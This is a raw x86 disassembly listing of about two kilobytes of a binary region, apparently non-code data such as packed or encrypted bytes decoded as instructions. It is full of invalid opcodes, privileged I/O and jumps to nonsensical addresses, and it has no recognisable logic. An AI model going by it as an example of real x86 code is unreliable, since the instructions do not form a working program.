  41a3f0:	or     ebx,DWORD PTR [edi+0x45477449]
  41a3f6:	call   0xcb2deb79
  41a3fb:	xchg   esp,eax
  41a3fc:	mov    ch,0x8b
  41a3fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3ff:	retf   
  41a400:	jmp    0x41a3be
  41a402:	sbb    al,0x86
  41a404:	and    bh,ch
  41a406:	and    eax,0xe5d348b7
  41a40b:	push   esp
  41a40c:	and    DWORD PTR [edx+0xb847512],ebx
  41a412:	jmp    0xdbdb055f
  41a417:	clc    
  41a418:	xor    al,0xa8
  41a41a:	sub    dl,bl
  41a41c:	test   BYTE PTR [eax],0xf1
  41a41f:	scas   eax,DWORD PTR es:[edi]
  41a420:	mov    ds:0xb66dbabe,al
  41a425:	shl    DWORD PTR [ebx-0x23],cl
  41a428:	push   cs
  41a429:	dec    edi
  41a42a:	cmp    ebp,DWORD PTR [edx-0x7e]
  41a42d:	loope  0x41a470
  41a42f:	jns    0x41a3e2
  41a431:	pop    es
  41a432:	add    eax,0x907f3b2e
  41a437:	(bad)  
  41a438:	xlat   BYTE PTR ds:[ebx]
  41a439:	cmp    al,0x60
  41a43b:	hlt    
  41a43c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a43d:	and    ebx,edi
  41a43f:	cmp    DWORD PTR [edx],edx
  41a441:	mov    db3,edx
  41a444:	xor    DWORD PTR [ebx-0x35],edx
  41a447:	add    dh,BYTE PTR [edx-0x43ab99be]
  41a44d:	mov    dh,0x2d
  41a450:	pop    es
  41a451:	js     0x41a45a
  41a453:	cmp    ch,ah
  41a455:	jle    0x41a4d1
  41a457:	dec    esp
  41a458:	lds    edi,FWORD PTR [edx-0x17d9b230]
  41a45e:	retf   
  41a45f:	call   0xd0e587b6
  41a464:	in     al,0x96
  41a466:	addr16 push ebx
  41a468:	push   cs
  41a469:	or     ecx,DWORD PTR [edi+0x1d]
  41a46c:	push   ebx
  41a46d:	mov    ds:0x9aef1a88,eax
  41a472:	mov    bl,0x10
  41a474:	imul   esi,DWORD PTR [eax],0xffffffda
  41a477:	call   0xec801839
  41a47c:	push   ebx
  41a47d:	mov    ebx,0x97b26774
  41a482:	ds xchg ecx,eax
  41a484:	xchg   ebx,eax
  41a485:	aaa    
  41a486:	outs   dx,DWORD PTR ds:[esi]
  41a487:	daa    
  41a488:	mov    ds:0x9067d472,eax
  41a48d:	inc    esi
  41a48e:	jne    0x41a48d
  41a490:	fcomp  QWORD PTR [edi-0x54]
  41a493:	xor    esp,DWORD PTR [edi+0x10]
  41a496:	or     DWORD PTR [eax],ebp
  41a498:	test   DWORD PTR [edx],esi
  41a49a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49b:	mov    eax,0x41901140
  41a4a0:	cs out dx,eax
  41a4a2:	jl     0x41a4fb
  41a4a4:	jbe    0x41a502
  41a4a6:	mov    al,ds:0xdee1cfb8
  41a4ab:	jp     0x41a52c
  41a4ad:	push   cs
  41a4ae:	xchg   ebx,eax
  41a4af:	scas   al,BYTE PTR es:[edi]
  41a4b0:	cmp    DWORD PTR [edi+0x5b],esi
  41a4b3:	pop    esp
  41a4b4:	or     DWORD PTR [ecx-0xb8b1f4b],edx
  41a4ba:	push   0xffffffbd
  41a4bc:	and    ch,dh
  41a4be:	in     al,0xae
  41a4c0:	inc    eax
  41a4c1:	ficomp DWORD PTR [eax-0x4f]
  41a4c4:	pop    esp
  41a4c5:	jp     0x41a4e2
  41a4c7:	mov    ds:0x7580e638,al
  41a4cc:	lock push ds
  41a4ce:	xchg   esp,eax
  41a4cf:	add    bh,BYTE PTR [eax*2+0x3f15c919]
  41a4d6:	add    al,0xbc
  41a4d8:	mov    cl,0x1e
  41a4da:	jns    0x41a4a0
  41a4dc:	aam    0x13
  41a4de:	(bad)  
  41a4df:	cmc    
  41a4e0:	jmp    0xc8d5:0x725a324f
  41a4e7:	sub    ah,BYTE PTR [eax+0x23]
  41a4ea:	sbb    eax,DWORD PTR [esi]
  41a4ec:	ins    BYTE PTR es:[edi],dx
  41a4ed:	mov    al,ds:0xe6677216
  41a4f2:	imul   edi,DWORD PTR [ecx],0xffffffca
  41a4f5:	add    esp,DWORD PTR [eax+edi*8-0x14]
  41a4f9:	icebp  
  41a4fa:	mov    cl,0xeb
  41a4fc:	mov    ds:0x3731696c,eax
  41a501:	pop    edi
  41a502:	out    dx,al
  41a503:	jo     0x41a4f3
  41a505:	cmp    DWORD PTR [ebx-0x5de58c6],esi
  41a50b:	retf   
  41a50c:	sbb    eax,0x2cc3d58f
  41a511:	inc    ebp
  41a512:	ficom  DWORD PTR [edx+0x48fff6f3]
  41a518:	xor    eax,DWORD PTR [ecx+0x26febf20]
  41a51e:	int3   
  41a51f:	xor    BYTE PTR [ecx+0x7d],bl
  41a522:	cmp    al,0xa0
  41a524:	dec    edi
  41a525:	test   DWORD PTR [edx+0x13],0xc22a06e0
  41a52c:	ss ret 
  41a52e:	std    
  41a52f:	mov    ds:0xe2455233,al
  41a534:	daa    
  41a535:	push   ds
  41a536:	mov    al,0xdb
  41a538:	call   0xd82e:0x527bf5cd
  41a53f:	out    0x6a,eax
  41a541:	loopne 0x41a55d
  41a543:	jne    0x41a51b
  41a545:	dec    edi
  41a546:	pop    esp
  41a547:	pop    ebx
  41a548:	inc    edx
  41a549:	jge    0x41a514
  41a54b:	frstor [ebx+0x51967860]
  41a551:	sub    eax,DWORD PTR [edx+esi*4+0x75]
  41a555:	xchg   BYTE PTR [edi],ah
  41a557:	dec    ebp
  41a558:	in     al,0x97
  41a55a:	cmp    ebx,DWORD PTR [esi]
  41a55c:	(bad)  
  41a55d:	ins    DWORD PTR es:[edi],dx
  41a55e:	adc    esi,DWORD PTR ds:0xd797a91e
  41a564:	xlat   BYTE PTR ds:[ebx]
  41a565:	lock mov edx,DWORD PTR [esi+ecx*4-0x1]
  41a56a:	call   0xd2211645
  41a56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a570:	(bad)  
  41a572:	rcr    BYTE PTR [esp+esi*1+0x51],cl
  41a576:	scas   al,BYTE PTR es:[edi]
  41a577:	imul   esp,DWORD PTR [edi+0x12],0xb56b32b0
  41a57e:	dec    edi
  41a57f:	fwait
  41a580:	rcl    edx,0xff
  41a583:	sub    DWORD PTR [ecx+0x12],0xe9cae7c5
  41a58a:	adc    edi,DWORD PTR [eax+ecx*2]
  41a58d:	and    al,0x9c
  41a58f:	mov    dl,0x7d
  41a591:	aam    0xf3
  41a593:	add    edi,esi
  41a595:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a596:	add    al,0xc2
  41a598:	(bad)  
  41a599:	pop    ebp
  41a59a:	mov    bl,0xae
  41a59c:	pushf  
  41a59d:	mov    cl,dl
  41a59f:	or     BYTE PTR [ebx],dl
  41a5a1:	test   eax,0x1fd7673c
  41a5a6:	pop    es
  41a5a7:	cwde   
  41a5a8:	jle    0x41a56c
  41a5aa:	cmp    al,0xe3
  41a5ac:	(bad)  
  41a5ad:	mov    ds:0xc06e16a1,eax
  41a5b3:	jb     0x41a58f
  41a5b5:	jb     0x41a5bc
  41a5b7:	lods   al,BYTE PTR ds:[esi]
  41a5b8:	in     al,0xf8
  41a5ba:	int    0x77
  41a5bc:	jo     0x41a57a
  41a5be:	jno    0x41a5dc
  41a5c0:	repnz (bad) 
  41a5c2:	mov    dl,0x71
  41a5c4:	xor    eax,DWORD PTR [edx]
  41a5c6:	mov    ds:0xa8d5e1f,eax
  41a5cb:	ins    BYTE PTR es:[edi],dx
  41a5cc:	addr16 sub al,0x9c
  41a5cf:	cdq    
  41a5d0:	(bad)  
  41a5d1:	cwde   
  41a5d2:	lods   eax,DWORD PTR ds:[esi]
  41a5d3:	dec    esi
  41a5d4:	ins    DWORD PTR es:[edi],dx
  41a5d5:	inc    edx
  41a5d6:	adc    DWORD PTR [eax-0x69ee0b2c],edi
  41a5dc:	bound  eax,QWORD PTR [ecx-0x4e46aaf]
  41a5e2:	paddusw mm1,QWORD PTR ds:0xde047d1
  41a5e9:	xor    ebx,ebx
  41a5eb:	sbb    bh,bh
  41a5ed:	scas   eax,DWORD PTR es:[edi]
  41a5ee:	mov    esi,0x90611e2f
  41a5f3:	das    
  41a5f4:	sahf   
  41a5f5:	scas   eax,DWORD PTR es:[edi]
  41a5f6:	add    cl,0xab
  41a5f9:	int    0x3c
  41a5fb:	add    eax,0x3bf02271
  41a600:	loope  0x41a58f
  41a602:	fstp   DWORD PTR [ecx]
  41a604:	push   0xffffffc1
  41a606:	lods   eax,DWORD PTR ds:[esi]
  41a607:	and    eax,0xaa5c00f5
  41a60c:	mov    bh,0x75
  41a60e:	jecxz  0x41a60b
  41a610:	xor    al,0xd9
  41a612:	xchg   esp,eax
  41a613:	fdivr  DWORD PTR [edx+ebx*4+0x1]
  41a617:	ret    0xacda
  41a61a:	icebp  
  41a61b:	push   esp
  41a61c:	ret    0xf2b5
  41a61f:	aas    
  41a620:	inc    edx
  41a621:	retf   0x7f9d
  41a624:	dec    edi
  41a625:	ins    BYTE PTR es:[edi],dx
  41a626:	xor    DWORD PTR [ebp+0x50],edi
  41a629:	xor    dl,cl
  41a62b:	pop    ebp
  41a62c:	jbe    0x41a5f6
  41a62e:	cld    
  41a62f:	and    al,0x70
  41a631:	pop    edi
  41a632:	(bad)  
  41a633:	iret   
  41a634:	lods   al,BYTE PTR ds:[esi]
  41a635:	inc    edx
  41a636:	jb     0x41a60d
  41a638:	mov    dh,0xac
  41a63a:	arpl   WORD PTR [ebp-0x73],dx
  41a63d:	mov    bl,0xb8
  41a63f:	icebp  
  41a640:	dec    edx
  41a641:	data16 into 
  41a643:	fcmovnb st,st(2)
  41a645:	xchg   esp,eax
  41a646:	(bad)  [edx]
  41a648:	inc    ecx
  41a649:	mov    edi,0xd0df67c3
  41a64e:	sbb    ecx,DWORD PTR [edi-0x32c63869]
  41a654:	add    DWORD PTR [ecx],edi
  41a656:	cmp    al,0x94
  41a658:	and    ch,BYTE PTR [ecx+0x5e4b158f]
  41a65e:	push   edx
  41a65f:	pop    ebx
  41a660:	xor    BYTE PTR [ecx-0x775a34a4],ch
  41a666:	mov    bl,0x5f
  41a668:	dec    ecx
  41a669:	adc    eax,0xe8bfe1cf
  41a66e:	scas   al,BYTE PTR es:[edi]
  41a66f:	or     esi,edi
  41a671:	aad    0xe9
  41a673:	ins    DWORD PTR es:[edi],dx
  41a674:	xor    dh,dl
  41a676:	cmp    eax,0xbf03de4b
  41a67b:	(bad)  
  41a67c:	pushf  
  41a67d:	mul    DWORD PTR [ecx+ecx*4]
  41a680:	lods   al,BYTE PTR ds:[esi]
  41a681:	dec    eax
  41a682:	pop    esp
  41a683:	das    
  41a684:	sbb    eax,0x618719e1
  41a689:	(bad)  
  41a68a:	mov    esi,0x2acaf8da
  41a68f:	ret    0xa312
  41a692:	dec    ecx
  41a693:	pop    esi
  41a694:	push   cs
  41a695:	lock push 0xa7786c18
  41a69b:	in     eax,dx
  41a69c:	jne    0x41a716
  41a69e:	es retf 0x9678
  41a6a2:	push   ecx
  41a6a3:	mov    dl,0x26
  41a6a5:	cmp    al,BYTE PTR [edi+edx*1+0x11fc69db]
  41a6ac:	push   cs
  41a6ad:	gs ret 
  41a6af:	pop    ebx
  41a6b0:	(bad)  
  41a6b1:	mov    ecx,0xd442d62c
  41a6b6:	ss xchg esp,eax
  41a6b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6b9:	lahf   
  41a6ba:	ins    BYTE PTR es:[edi],dx
  41a6bb:	inc    edx
  41a6bc:	add    esp,ebp
  41a6be:	aam    0x9a
  41a6c0:	add    esp,DWORD PTR [edi+0x4a59cde1]
  41a6c6:	pop    ds
  41a6c7:	and    esi,DWORD PTR [esi+0x43fb38ab]
  41a6cd:	add    DWORD PTR [edx+0x31],edi
  41a6d0:	push   esp
  41a6d1:	sbb    al,0xea
  41a6d3:	jecxz  0x41a6a0
  41a6d5:	cli    
  41a6d6:	adc    BYTE PTR [ebx-0x3],bl
  41a6d9:	push   cs
  41a6da:	fbstp  TBYTE PTR [ebx]
  41a6dc:	push   esi
  41a6dd:	cmp    ah,bl
  41a6df:	lds    edx,FWORD PTR [ecx]
  41a6e1:	jno    0x41a680
  41a6e3:	ror    BYTE PTR [esp+edi*4],cl
  41a6e6:	sbb    al,0xe7
  41a6e8:	xchg   esi,eax
  41a6e9:	mov    eax,ds:0xc3649749
  41a6ee:	pushf  
  41a6ef:	pop    esi
  41a6f0:	pop    ebp
  41a6f1:	push   ebp
  41a6f2:	mov    bl,0x63
  41a6f4:	sub    esp,DWORD PTR [edx-0x40]
  41a6f7:	and    DWORD PTR gs:[ebp-0x2d],edi
  41a6fb:	cmc    
  41a6fc:	ds jp  0x41a729
  41a6ff:	mov    ch,0xca
  41a701:	push   edx
  41a702:	mov    WORD PTR [ebp-0x71d6292d],es
  41a708:	std    
  41a709:	cmp    al,0x68
  41a70b:	adc    BYTE PTR [ebp+0x62],dl
  41a70e:	je     0x41a739
  41a710:	outs   dx,BYTE PTR ds:[esi]
  41a711:	mov    al,ds:0xc30f1d60
  41a716:	imul   edx,DWORD PTR [edi],0x18
  41a719:	shl    DWORD PTR [ecx],1
  41a71b:	and    BYTE PTR [edx],cl
  41a71d:	dec    edi
  41a71e:	loopne 0x41a6b4
  41a720:	adc    DWORD PTR [esi+esi*4-0x3c],edx
  41a724:	vmulps xmm3,xmm4,xmm0
  41a728:	lods   al,BYTE PTR ds:[esi]
  41a729:	ss aaa 
  41a72b:	inc    edx
  41a72c:	xor    al,0x4d
  41a72e:	pop    ebx
  41a72f:	pop    esi
  41a730:	das    
  41a731:	inc    ecx
  41a732:	dec    edi
  41a733:	xchg   edi,eax
  41a734:	adc    eax,0xab6543ea
  41a739:	call   0x75c717f2
  41a73e:	mov    esi,0x1f5ac50a
  41a743:	xchg   BYTE PTR [eax+0x4],bh
  41a746:	jl     0x41a726
  41a748:	loop   0x41a715
  41a74a:	mov    edx,?
  41a74c:	xor    DWORD PTR [eax-0x2683bf47],ebx
  41a752:	pop    esp
  41a753:	(bad)  
  41a754:	lahf   
  41a755:	or     al,0x50
  41a757:	mov    ch,0x8a
  41a759:	mov    eax,0x8dc0c164
  41a75e:	and    al,0x7b
  41a760:	rcr    bl,cl
  41a762:	cmp    BYTE PTR [eax-0x12],0x4
  41a766:	mov    edi,0xe84336f4
  41a76b:	inc    esi
  41a76c:	loope  0x41a73f
  41a76e:	fsub   QWORD PTR [esi+0x57]
  41a771:	mov    ecx,0xb11d87fc
  41a776:	fist   DWORD PTR [ecx+ebp*2+0x29ba38d6]
  41a77d:	pop    DWORD PTR [esi-0x71]
  41a780:	inc    eax
  41a781:	ret    
  41a782:	sub    DWORD PTR [esi-0xb5ab738],edx
  41a788:	fild   DWORD PTR ds:0x294a38f8
  41a78e:	sbb    DWORD PTR [ecx+0x7d94a123],ebp
  41a794:	leave  
  41a795:	aas    
  41a796:	mov    edx,0x3c99fabd
  41a79b:	adc    eax,0xec8a44e3
  41a7a0:	adc    al,0xc9
  41a7a2:	es xor al,0x61
  41a7a5:	sub    al,0x3e
  41a7a7:	dec    BYTE PTR [ebx+0x60]
  41a7aa:	and    BYTE PTR [edx-0x66],dh
  41a7ad:	inc    esp
  41a7ae:	adc    DWORD PTR [eax],edx
  41a7b0:	ror    DWORD PTR [esi-0x1f036078],cl
  41a7b6:	out    dx,al
  41a7b7:	inc    ebp
  41a7b8:	xchg   esp,eax
  41a7b9:	mov    BYTE PTR ds:0xdb26d87c,ch
  41a7bf:	push   esp
  41a7c0:	stos   BYTE PTR es:[edi],al
  41a7c1:	mov    BYTE PTR [esi-0x9],al
  41a7c4:	xlat   BYTE PTR ds:[ebx]
  41a7c5:	mov    eax,0xf528798c
  41a7ca:	mov    ds:0x73f1319f,al
  41a7cf:	inc    eax
  41a7d0:	jnp    0x41a7a9
  41a7d2:	lahf   
  41a7d3:	push   0x3c
  41a7d5:	js     0x41a7de
  41a7d7:	je     0x41a7f5
  41a7d9:	and    cl,BYTE PTR [esi+0x66ad32f1]
  41a7df:	idiv   DWORD PTR [ecx+0x46]
  41a7e2:	sbb    al,0x65
  41a7e4:	int3   
  41a7e5:	jns    0x41a775
  41a7e7:	sbb    ch,BYTE PTR [ecx+0x3f]
  41a7ea:	addr16 mov edi,0xec25c274
  41a7f0:	mov    eax,ds:0x951113da
  41a7f5:	fild   WORD PTR ds:0xd753538b
  41a7fb:	je     0x41a7ad
  41a7fd:	jmp    DWORD PTR [edx+edx*1-0x8d3752f]
  41a804:	mov    ecx,0x564d7305
  41a809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a80a:	cmp    DWORD PTR [eax+0x7885bdf9],ebp
  41a810:	cdq    
  41a811:	loopne 0x41a843
  41a813:	inc    ebp
  41a814:	pinsrw mm7,WORD PTR [esi],0x75
  41a818:	inc    esi
  41a819:	jno    0x41a7fb
  41a81b:	sbb    DWORD PTR [eax-0x71],ebp
  41a81e:	xor    edx,DWORD PTR [edx-0x62670dda]
  41a824:	xor    eax,0x5291320a
  41a829:	lea    ecx,[ecx+0x449755ba]
  41a82f:	outs   dx,BYTE PTR ds:[esi]
  41a830:	push   esp
  41a831:	xchg   esi,edi
  41a833:	jmp    0xf2ab0c4a
  41a838:	test   ch,dh
  41a83a:	xor    al,0xc7
  41a83c:	in     al,0xd5
  41a83e:	fcomp  DWORD PTR [edx+ebp*8]
  41a841:	pop    ecx
  41a842:	int3   
  41a843:	call   0xc9a1456c
  41a848:	or     eax,DWORD PTR [esi]
  41a84a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a84b:	in     al,dx
  41a84c:	push   eax
  41a84d:	fs addr16 test eax,0x4bf018e7
  41a854:	je     0x41a7e1
  41a856:	sub    dl,bl
  41a858:	call   0xc7658c53
  41a85d:	cmc    
  41a85e:	int    0x88
  41a860:	outs   dx,DWORD PTR ds:[esi]
  41a861:	and    DWORD PTR [eax-0x15349b78],ecx
  41a867:	and    al,0x33
  41a869:	jno    0x41a877
  41a86b:	lods   al,BYTE PTR ds:[esi]
  41a86c:	adc    al,ah
  41a86e:	cli    
  41a86f:	aad    0x6f
  41a871:	das    
  41a872:	shl    ecx,cl
  41a874:	loop   0x41a7f6
  41a876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a877:	lock pusha 
  41a879:	add    dl,BYTE PTR cs:[edi]
  41a87c:	push   ebx
  41a87d:	mov    al,0x8d
  41a87f:	sbb    DWORD PTR [ecx],ebp
  41a881:	xchg   edx,eax
  41a882:	outs   dx,BYTE PTR ds:[esi]
  41a883:	xor    DWORD PTR [edx+edi*2-0x5e],0x8faa50e4
  41a88b:	lods   al,BYTE PTR ds:[esi]
  41a88c:	jp     0x41a90c
  41a88e:	sbb    al,0xac
  41a890:	or     ecx,DWORD PTR [ebx+esi*4]
  41a893:	mov    al,0x71
  41a895:	out    dx,eax
  41a896:	nop
  41a897:	cld    
  41a898:	xor    al,0xf9
  41a89a:	js     0x41a878
  41a89c:	out    dx,al
  41a89d:	add    BYTE PTR [eax+esi*1+0x3c8dbcd3],dl
  41a8a4:	sahf   
  41a8a5:	add    BYTE PTR [eax+0x69b760dd],al
  41a8ab:	or     dh,BYTE PTR [ebp-0x58]
  41a8ae:	data16 adc ah,al
  41a8b1:	cmp    al,0x3
  41a8b3:	shl    BYTE PTR [edi-0x12065bc],cl
  41a8b9:	sub    eax,0x4a25b4b4
  41a8be:	retf   
  41a8bf:	cmp    ah,BYTE PTR [esi+0x1459c5d8]
  41a8c5:	xchg   bl,dh
  41a8c7:	imul   ebp,DWORD PTR [ebx-0x4e],0x76
  41a8cb:	iret   
  41a8cc:	inc    edi
  41a8cd:	test   DWORD PTR [edx+0x52cbb301],0x9c1f7ab3
  41a8d7:	xor    BYTE PTR [ecx+ebp*4-0x3a],ah
  41a8db:	or     ah,BYTE PTR [ecx+0x7add850f]
  41a8e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8e2:	jp     0x41a932
  41a8e4:	jb     0x41a867
  41a8e6:	ss sbb al,0x69
  41a8e9:	ror    BYTE PTR [eax],1
  41a8eb:	mov    edx,0xdab64aad
  41a8f0:	(bad)  
  41a8f1:	jmp    0x4cf9a587
  41a8f6:	jb     0x41a8b4
  41a8f8:	outs   dx,DWORD PTR ds:[esi]
  41a8f9:	daa    
  41a8fa:	int    0xab
  41a8fc:	push   ebp
  41a8fd:	mov    ebx,0x96c797fa
  41a902:	jns    0x41a94a
  41a904:	mov    edi,0x229b8ffb
  41a90a:	mov    al,0xc1
  41a90c:	sub    ah,BYTE PTR [esi]
  41a90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a90f:	iret   
  41a910:	push   ecx
  41a911:	cdq    
  41a912:	repz push edi
  41a914:	pop    edx
  41a915:	jbe    0x41a8ae
  41a917:	cwde   
  41a918:	mov    eax,ds:0x4593edda
  41a91d:	sub    ch,BYTE PTR [ebp+0x9]
  41a920:	mov    WORD PTR [eax+0x62],gs
  41a923:	fisubr WORD PTR [esi]
  41a925:	shr    DWORD PTR [ebp-0x5e21c1ef],0x65
  41a92c:	jecxz  0x41a9a5
  41a92e:	xchg   DWORD PTR [edx],eax
  41a930:	out    0x22,eax
  41a932:	(bad)  
  41a933:	jo     0x41a94d
  41a935:	dec    esp
  41a937:	(bad)  
  41a938:	sbb    bh,BYTE PTR [ebx-0x43]
  41a93b:	out    0x36,eax
  41a93d:	dec    esi
  41a93e:	and    al,0x59
  41a940:	and    BYTE PTR [ecx-0x4bc9f853],0x8d
  41a947:	pop    ebp
  41a948:	mov    esp,0xc2715881
  41a94d:	jno    0x41a8e1
  41a94f:	shl    bh,0x47
  41a952:	mov    WORD PTR [ecx+0x23],gs
  41a955:	xor    DWORD PTR [esi],0xffffffc7
  41a958:	call   0xc354:0x108d3de5
  41a95f:	mov    esp,0x381cfc7f
  41a964:	cli    
  41a965:	jl     0x41a9bd
  41a967:	pop    ecx
  41a968:	loopne 0x41a94a
  41a96a:	xor    eax,0xbd45bb4a
  41a96f:	(bad)  
  41a970:	mov    WORD PTR [edx-0x1c],fs
  41a973:	mov    gs,esp
  41a975:	out    dx,al
  41a976:	mov    bl,0xa2
  41a978:	add    al,0xac
  41a97a:	lods   eax,DWORD PTR ds:[esi]
  41a97b:	rcr    DWORD PTR [ebx-0x35],0xf9
  41a97f:	sahf   
  41a980:	sbb    al,0xc3
  41a982:	xchg   ebp,eax
  41a983:	es aam 0xa8
  41a986:	test   ebx,esi
  41a988:	mov    bl,BYTE PTR [ebp+0x10]
  41a98b:	mov    eax,0xe9a80852
  41a990:	jmp    0xde40fc79
  41a995:	pusha  
  41a996:	outs   dx,BYTE PTR ds:[esi]
  41a997:	add    BYTE PTR [eax-0x46],dh
  41a99a:	test   ebp,eax
  41a99c:	ret    
  41a99d:	aad    0xb1
  41a99f:	in     al,dx
  41a9a0:	into   
  41a9a1:	xor    DWORD PTR [ebp+0x31dc4fc7],esi
  41a9a7:	adc    esp,DWORD PTR [edx]
  41a9a9:	test   esi,esp
  41a9ab:	sbb    bl,BYTE PTR [esi]
  41a9ad:	ins    BYTE PTR es:[edi],dx
  41a9ae:	jl     0x41a9e1
  41a9b0:	(bad)  
  41a9b1:	push   0xe3592b0
  41a9b6:	add    al,0x6
  41a9b8:	push   edi
  41a9b9:	dec    ebp
  41a9ba:	sahf   
  41a9bb:	inc    ecx
  41a9bc:	push   edi
  41a9bd:	into   
  41a9be:	inc    edx
  41a9bf:	daa    
  41a9c0:	or     DWORD PTR [esi+0x19],ecx
  41a9c3:	push   es
  41a9c4:	jae    0x41a95b
  41a9c6:	inc    esp
  41a9c7:	std    
  41a9c8:	pusha  
  41a9c9:	sub    BYTE PTR [esi],dl
  41a9cb:	mov    dh,0x95
  41a9cd:	sahf   
  41a9ce:	rcr    esp,0xa1
  41a9d1:	or     eax,edi
  41a9d3:	and    DWORD PTR [ebp-0x2125c4ae],0x90ee443
  41a9dd:	sub    DWORD PTR [ebx],ebx
  41a9df:	ret    0x2c5
  41a9e2:	push   esp
  41a9e3:	add    esi,ebx
  41a9e5:	pop    edi
  41a9e6:	retf   0x910
  41a9e9:	jmp    0x2556:0x86a89057
  41a9f0:	bound  edx,QWORD PTR [ebp-0x7dbb7a08]
  41a9f6:	dec    eax
  41a9f7:	cmc    
  41a9f8:	fcomp  DWORD PTR [eax]
  41a9fa:	cmp    al,0xf5
  41a9fc:	xchg   esi,eax
  41a9fd:	out    0x22,eax
  41a9ff:	test   BYTE PTR [ecx-0x3d],0x60
  41aa03:	retf   0x1c89
  41aa06:	sub    ecx,esi
  41aa08:	add    bl,BYTE PTR [edi+esi*2]
  41aa0b:	shl    DWORD PTR [ecx],cl
  41aa0d:	pop    ebx
  41aa0e:	clc    
  41aa0f:	sbb    BYTE PTR ds:0xb7802e6d,0x95
  41aa16:	cmp    dh,dl
  41aa18:	rcl    dh,cl
  41aa1a:	pop    ds
  41aa1b:	loope  0x41aa82
  41aa1d:	push   edx
  41aa1e:	mov    cl,0x9d
  41aa20:	dec    eax
  41aa21:	mov    ah,0x2c
  41aa23:	sti    
  41aa24:	dec    edx
  41aa25:	xor    DWORD PTR [ebx],ebx
  41aa27:	mov    si,0x1598
  41aa2b:	push   0x7733df83
  41aa30:	aaa    
  41aa31:	in     al,0x75
  41aa33:	cmp    al,0x53
  41aa35:	xor    eax,0x7ee0feb6
  41aa3a:	scas   eax,DWORD PTR es:[edi]
  41aa3b:	jp     0x41aaa1
  41aa3d:	mov    esp,0x4ed42aaa
  41aa42:	aad    0x32
  41aa44:	and    ebx,DWORD PTR [edx]
  41aa46:	xor    eax,0xc6725f90
  41aa4b:	jle    0x41aa1e
  41aa4d:	(bad)  
  41aa4e:	cmp    al,0xec
  41aa50:	loop   0x41aabe
  41aa52:	jg     0x41aace
  41aa54:	out    dx,eax
  41aa55:	adc    edi,ebx
  41aa57:	push   0xffffffc7
  41aa59:	mov    dh,0xfa
  41aa5b:	inc    eax
  41aa5c:	clc    
  41aa5d:	inc    eax
  41aa5e:	jl     0x41aa4e
  41aa60:	out    0xd1,eax
  41aa62:	sbb    al,BYTE PTR ss:[eax-0x7dd749d7]
  41aa69:	shl    DWORD PTR [esi],0xd9
  41aa6c:	sub    eax,0xef8d0be0
  41aa71:	xor    edi,ebp
  41aa73:	sti    
  41aa74:	jl     0x41aa79
  41aa76:	dec    ebx
  41aa77:	pop    es
  41aa78:	mov    esi,0x51e6de09
  41aa7d:	jo     0x41aa26
  41aa7f:	jb     0x41aaba
  41aa81:	sub    edx,DWORD PTR [eax-0x55022fdf]
  41aa87:	scas   al,BYTE PTR es:[edi]
  41aa88:	dec    esi
  41aa89:	imul   cl
  41aa8b:	mov    ah,0xef
  41aa8d:	sbb    al,BYTE PTR [esi+ebp*4+0x2e047787]
  41aa94:	or     DWORD PTR [ebx],edx
  41aa96:	mov    DWORD PTR [edi],edi
  41aa98:	sub    dl,al
  41aa9a:	hlt    
  41aa9b:	adc    DWORD PTR [eax+edx*4+0x2c],0xfd4a5d27
  41aaa3:	sbb    ah,BYTE PTR [edx+0xf419abd]
  41aaa9:	stos   DWORD PTR es:[edi],eax
  41aaaa:	push   ecx
  41aaab:	push   0x1e
  41aaad:	int    0xe8
  41aaaf:	add    al,0xab
  41aab1:	or     bh,dh
  41aab3:	xchg   ecx,eax
  41aab4:	lea    ebx,[edi]
  41aab6:	in     al,dx
  41aab7:	and    DWORD PTR [ecx],0x4f
  41aaba:	dec    ecx
  41aabb:	xchg   BYTE PTR [edi-0x26],ah
  41aabe:	outs   dx,DWORD PTR ds:[esi]
  41aabf:	ret    0x62eb
  41aac2:	or     al,0x4d
  41aac4:	das    
  41aac5:	mov    esi,esi
  41aac7:	rol    DWORD PTR [ebp+0x142a9545],1
  41aacd:	pushf  
  41aace:	ja     0x41aaa0
  41aad0:	aad    0x3e
  41aad2:	in     al,0x70
  41aad4:	stos   BYTE PTR es:[edi],al
  41aad5:	adc    DWORD PTR [edi+0x4a],0xffffffe5
  41aad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aada:	sub    al,0xb9
  41aadc:	cmp    cl,BYTE PTR [ebx-0x1d4850c1]
  41aae2:	adc    cl,dh
  41aae4:	jecxz  0x41aa80
  41aae6:	sbb    al,0xba
  41aae8:	retf   0x53ad
  41aaeb:	xchg   ecx,eax
  41aaec:	lds    ecx,FWORD PTR [ebx+0xa936dcb]
  41aaf2:	mov    ds:0x896fd0fa,al
  41aaf7:	movntps XMMWORD PTR [ebx-0x65f4fbca],xmm5
  41aafe:	or     al,0x2c
  41ab00:	cmp    eax,0x38d686b3
  41ab05:	xor    al,0x3f
  41ab07:	jl     0x41aa9c
  41ab09:	add    BYTE PTR [ebx+ebp*8+0x3b],bh
  41ab0d:	shl    BYTE PTR [ebx],cl
  41ab0f:	and    BYTE PTR [edx],cl
  41ab11:	dec    eax
  41ab12:	pop    esp
  41ab13:	stos   BYTE PTR es:[edi],al
  41ab14:	mov    ds:0x40b0d8da,al
  41ab19:	aad    0x6b
  41ab1b:	inc    ebp
  41ab1c:	mov    ebp,0xa550d585
  41ab21:	add    DWORD PTR [eax+0x15cdbd4],ebx
  41ab27:	mul    DWORD PTR [edi+0x4d]
  41ab2a:	dec    eax
  41ab2b:	mov    ch,0x6d
  41ab2d:	jle    0x41aaba
  41ab2f:	icebp  
  41ab30:	adc    DWORD PTR [ebx],0xffffffc1
  41ab33:	outs   dx,DWORD PTR ds:[esi]
  41ab34:	mov    ds:0xc0727438,al
  41ab39:	dec    edx
  41ab3a:	test   DWORD PTR [edi],edx
  41ab3c:	pop    ds
